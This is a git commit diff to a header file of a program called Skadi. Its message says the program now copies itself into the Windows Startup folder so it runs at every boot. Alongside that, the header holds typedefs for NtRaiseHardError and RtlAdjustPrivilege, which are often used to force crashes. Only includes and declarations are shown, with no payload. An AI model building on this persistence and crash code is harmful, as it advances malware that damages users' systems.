2333e27d658c53797ec8f4bbfa1532683d4842df
Ace <adamopoulos@ceid.upatras.gr>
2017-11-19 20:02:50 +0200

    Skadi Now Copies her self into StartUp folder and now runs every time that the system starts

--- Skadi/Skadi.h
+++ Skadi/Skadi.h
@@ -2,6 +2,7 @@
 
 #include <stdlib.h>
 #include <string.h>
+#include <iostream>
 
 #ifdef __linux__
 
@@ -10,11 +11,23 @@ void linux_skadi();
 
 #elif _WIN32
 
-#include <Windows.h>
+#include <windows.h>
+#include <windef.h>
+#include <tchar.h>
+#include <shlobj.h>
+#include <wchar.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <Shlwapi.h>
+#include <shellAPI.h>
+
+#pragma comment(lib,"Shlwapi.lib")
 
 typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
 typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
 
+bool FileExists(std::wstring fileName);
+void copyFileToStartUp();
 void windows_skadi();
 
 #endif
